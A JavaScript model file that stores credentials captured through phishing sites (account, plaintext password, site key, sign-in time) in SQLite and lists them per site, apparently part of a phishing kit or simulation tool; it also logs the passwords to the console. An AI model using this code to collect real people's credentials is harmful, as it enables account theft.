
/**********
 * Phishing Account Model
 **********/
var extend = require('util')._extend;
var sqliteDB = require('../dao/sqliteDB');

var PhishingAccount = function(phishingAccount) {
	this.attrs = extend(this.defaults, phishingAccount);
};

module.exports = PhishingAccount;

PhishingAccount.prototype.attrs = {};
PhishingAccount.prototype.defaults = {
	_id: null,
	account: null,
	password: null,
	site_key: null,
	signin_time: null
};
PhishingAccount.prototype.isValid = function() {
	if(!this.attrs.account) {
		return 'server_msg.error_phishing_act_blank';
	}
	if(!this.attrs.password) {
		return 'server_msg.error_phishing_pwd_blank';
	}
	if(!this.attrs.site_key) {
		return 'server_msg.error_phishing_site_blank';
	}
	return null;
};
PhishingAccount.prototype.create = function(callback) {
	var conn = sqliteDB.getConnection();
	var sql = 'INSERT INTO phishing_account(account, password, site_key, signin_time) ' +
			'VALUES($account, $password, $site_key, $signin_time) ';
	var params = {
		$account:     this.attrs.account,
		$password:    this.attrs.password,
		$site_key:    this.attrs.site_key,
		$signin_time: this.attrs.signin_time
	};
	console.log(sql);
	console.log(params);
	conn.run(sql, params, callback);
	conn.close();
};

PhishingAccount.getBySiteKey = function(siteKey, callback) {
	var conn = sqliteDB.getConnection();
	var sql = 'SELECT pa.* FROM phishing_account pa ' +
			'WHERE pa.site_key = $site_key ' +
			'ORDER BY pa.signin_time DESC ';
	var params = {$site_key: siteKey};
	console.log(sql);
	console.log(params);
	conn.all(sql, params, callback);
	conn.close();
};